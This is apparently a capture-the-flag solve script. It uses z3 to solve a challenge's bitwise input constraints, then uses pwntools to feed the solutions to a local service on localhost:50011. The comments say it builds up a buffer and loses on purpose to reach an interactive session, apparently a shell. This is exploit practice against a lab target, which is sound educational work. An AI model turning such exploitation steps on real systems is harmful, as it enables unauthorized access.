import z3
from pwn import *

s = z3.Solver()
inp = [z3.BitVec(f'i{i}', 1) for i in range(0,32)]

#to get the rules from c file: sed "s/&& /\n/g" rules.txt | sed "s/input/inp/g" |awk '{print "s.add"$0""}'
s.add((((inp[10] ^ inp[17]) ^ (inp[22] & inp[18])) & ((inp[19] ^ (inp[23] ^ inp[19])) ^ (inp[8] | inp[20]))) == 0) 
s.add((((inp[29] ^ inp[4]) ^ inp[4]) | (inp[12] | inp[26])) == 0) 
s.add(((inp[10] & (inp[28] & (inp[15] | inp[4]))) | inp[28]) == 0) 
s.add((((inp[13] & inp[16]) & inp[13]) & inp[20]) == 0) 
s.add(((inp[3] | (inp[27] | inp[9])) | ((inp[6] & inp[14]) ^ (inp[1] | inp[26]))) == 0) 
s.add(((inp[13] ^ (inp[2] & (inp[8] | inp[20]))) & (inp[11] & inp[9])) == 0) 
s.add(((inp[15] | inp[4]) | ((inp[5] | inp[17]) | ((inp[6] & inp[14]) ^ (inp[1] | inp[26])))) == 0) 
s.add((((inp[30] & inp[2]) ^ inp[1]) | inp[15]) == 0) 
s.add((inp[7] & (inp[24] | inp[31])) == 0) 
s.add((((inp[15] | inp[4]) | inp[30]) & (inp[6] & inp[14])) == 0) 
s.add((inp[29] ^ (inp[16] | (inp[5] | inp[17]))) == 0) 
s.add((inp[0] | ((inp[10] & (inp[28] & (inp[15] | inp[4]))) | inp[27])) == 0) 
s.add(((((inp[29] ^ inp[4]) ^ inp[4]) ^ (inp[10] ^ inp[17])) | ((inp[10] | inp[14]) & inp[30])) == 0) 
s.add(((inp[28] & (inp[15] | inp[4])) & (inp[3] | inp[6])) == 0) 
s.add((inp[19] ^ (inp[8] | inp[22])) == 0) 
s.add((((inp[2] & (inp[8] | inp[20])) & (inp[24] | inp[5])) ^ inp[18]) == 0) 
s.add((((inp[30] & inp[2]) | (inp[27] | inp[9])) & inp[22]) == 0) 
s.add(((inp[21] | inp[28]) & (((inp[13] & inp[16]) & inp[13]) | inp[25])) == 0) 
s.add(((inp[31] | inp[19]) ^ (inp[21] | (inp[21] | inp[28]))) == 0) 
s.add((((inp[24] | inp[31]) & (inp[28] & (inp[15] | inp[4]))) ^ ((inp[3] | (inp[27] | inp[9])) ^ (inp[15] ^ (inp[29] & inp[7])))) == 0) 
s.add((((inp[11] & inp[1]) | inp[0]) ^ (inp[27] | inp[9])) == 0) 
s.add(((((inp[8] | inp[22]) & inp[21]) ^ ((inp[31] | inp[19]) | inp[6])) ^ (inp[11] | ((inp[15] | inp[4]) | inp[30]))) == 0) 
s.add(((inp[14] | inp[6]) & (inp[18] ^ inp[19])) == 0) 
s.add(((((inp[12] | inp[26]) ^ inp[18]) & (inp[11] & inp[1])) & ((inp[22] & inp[18]) | inp[3])) == 0) 
s.add(((inp[11] & ((inp[22] & inp[18]) | inp[15])) ^ (inp[27] ^ (inp[24] | inp[31]))) == 0) 
s.add((((inp[23] | inp[7]) | inp[13]) & (inp[1] | inp[26])) == 0) 
s.add(((inp[16] & inp[21]) | ((inp[21] | inp[28]) | inp[23])) == 0) 
s.add((inp[4] & inp[24]) == 0) 
s.add((inp[26] & ((inp[10] | inp[14]) ^ (inp[31] & inp[28]))) == 0) 
s.add((((inp[16] | (inp[5] | inp[17])) & (inp[21] | (inp[21] | inp[28]))) ^ ((inp[0] ^ inp[25]) ^ inp[31])) == 0) 
s.add((((inp[12] | inp[26]) | (inp[23] ^ inp[19])) ^ ((inp[13] & inp[16]) | (((inp[13] & inp[16]) & inp[13]) | inp[25]))) == 0) 
s.add((((inp[8] | inp[22]) & inp[21]) & (((inp[0] ^ inp[25]) & inp[3]) ^ inp[26])) == 0)

def getBytesNeeded():
    def handleZeroes(s):
        count = 0
        for index, b in enumerate(s):
            if b == '1':
                mod = index % 10
                c = len(str(index))
                count += ((1*c)+1)
                print("index", index + 1, count)
        return count + 4

    used = []
    totLen = 0
    bytesNedded = 70
    while s.check() == z3.sat and totLen <= bytesNedded:
        m = s.model()
        sol = [str(m.evaluate(inp_char)) for inp_char in inp]
        notUsed = list(filter(lambda tuple: "i" in tuple[1], enumerate(sol)))
        #print(notUsed)
        for i in range(0, 2**len(notUsed)):
            if totLen > bytesNedded:
                break
            bincomb = bin(i)[2:].zfill(len(notUsed))

            exampleSol = sol.copy()
            for index, item in enumerate(notUsed):
                exampleSol[item[0]] = bincomb[index]
            finalSol = ''.join(exampleSol)
            if finalSol in used:
                continue
            singleLen = handleZeroes(exampleSol)
            totLen += singleLen
            used.append(finalSol)
            print(totLen)
        s.add(z3.Or([f != s.model()[f] for f in inp]))
    print(used)
    return used

r = remote("localhost", 50011)
sols = getBytesNeeded()
#build up buffer
for sol in sols[0:-1]:
    r.recvuntil(b"]")
    r.sendline(sol)
    r.recvuntil(b"]")
    r.sendline(b"y")
    r.recvuntil(b"]")
    r.sendline(b"n")
# lose on purpose
r.recvuntil(b"]")
r.sendline(b"01"*16)
r.recvuntil(b"]")
r.sendline(b"n")
#win one last time
r.recvuntil(b"]")
r.sendline(sols[-1])
#r.interactive()
r.recvuntil(b"]")
r.sendline(b"n")
r.recvuntil(b"]")
r.sendline(b"y")

r.interactive()